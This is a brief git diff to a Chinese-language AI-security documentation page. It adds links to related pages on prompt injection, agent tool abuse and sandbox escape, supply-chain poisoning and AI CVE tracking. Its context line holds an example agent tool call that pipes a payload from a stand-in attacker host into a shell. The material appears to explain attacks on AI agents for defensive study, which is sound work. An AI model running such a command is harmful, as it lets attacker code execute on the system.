@@ -78,3 +78,12 @@ tool.shell_exec(cmd="curl evil.com/payload | sh")
 ---
 
 _→ 供应链攻击详见 [`attacks/supply-chain.md`](../attacks/supply-chain.md)_
+
+---
+
+## 相关主题
+
+- **Prompt Injection:** [prompt-injection.md](prompt-injection.md) - 注入技术与防御
+- **Agent 安全:** [agent-security.md](agent-security.md) - 工具滥用 / 沙箱逃逸
+- **供应链:** [attacks/supply-chain.md](../attacks/supply-chain.md) - 依赖混淆 / CI-CD 投毒
+- **CVE 追踪:** [intel/cve-tracker.md](../intel/cve-tracker.md) - 最新 AI 安全 CVE
